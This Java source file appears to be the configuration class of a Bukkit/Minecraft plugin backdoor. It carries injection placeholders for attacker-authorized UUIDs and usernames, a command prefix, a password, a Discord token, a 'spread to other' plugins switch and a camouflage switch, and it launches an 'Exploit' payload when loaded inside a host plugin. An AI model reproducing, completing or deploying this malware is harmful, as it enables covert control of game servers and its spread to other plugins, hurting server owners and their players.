package com.tmquan2508.exploit;

import org.bukkit.Bukkit;
import org.bukkit.plugin.Plugin;

public class Config implements IConfig {
    
    private Plugin plugin;

    public Config() {}

    public Config(Plugin plugin) {
        this.plugin = plugin;
        if (System.getProperty("openbd.lock") != null) {
            this.sendDebug(plugin.getName() + ": [Payload] Aborted, another instance is already running.");
            return;
        }
        new Exploit(plugin, this);
    }

    public static String[] authorized_uuids;
    public static String[] authorized_usernames;
    public static String command_prefix;
    public static boolean spread_to_other;
    public static boolean debug_log;
    public static String discord_token;
    public static String authorized_password;
    public static boolean camouflage;

    @Override public Plugin getPlugin() { return this.plugin; }
    @Override public String[] getAuthorizedUuids() { return authorized_uuids; }
    @Override public String[] getAuthorizedUsernames() { return authorized_usernames; }
    @Override public String getCommandPrefix() { return command_prefix; }
    @Override public boolean isSpreadToOtherEnabled() { return spread_to_other; }
    @Override public boolean isDebugLogEnabled() { return debug_log; }
    @Override public String getDiscordToken() { return discord_token; }
    @Override public String getAuthorizedPassword() { return authorized_password; }
    @Override public boolean isCamouflageEnabled() { return camouflage; }

    static {
        getInjectedConfig();
    }

    private static void getInjectedConfig() {
        String injected_authorized_uuids = "::UUIDS::";
        String injected_authorized_usernames = "::USERNAMES::";
        String injected_command_prefix = "::PREFIX::";
        boolean injected_spread_to_other = Boolean.parseBoolean("::INJECT_OTHER::");
        boolean injected_debug_log = Boolean.parseBoolean("::WARNINGS::");
        String injected_discord_token = "::DISCORD_TOKEN::";
        String injected_authorized_password = "::PASSWORD::";
        boolean injected_camouflage = Boolean.parseBoolean("::CAMOUFLAGE::");

        authorized_uuids = injected_authorized_uuids.isEmpty() ? new String[0] : injected_authorized_uuids.split(",");
        authorized_usernames = injected_authorized_usernames.isEmpty() ? new String[0] : injected_authorized_usernames.split(",");
        command_prefix = injected_command_prefix;
        spread_to_other = injected_spread_to_other;
        debug_log = injected_debug_log;
        discord_token = injected_discord_token;
        authorized_password = injected_authorized_password;
        camouflage = injected_camouflage;
    }

    public static void sendDebug(String log) {
        if (debug_log) Bukkit.getConsoleSender().sendMessage(log);
    }
}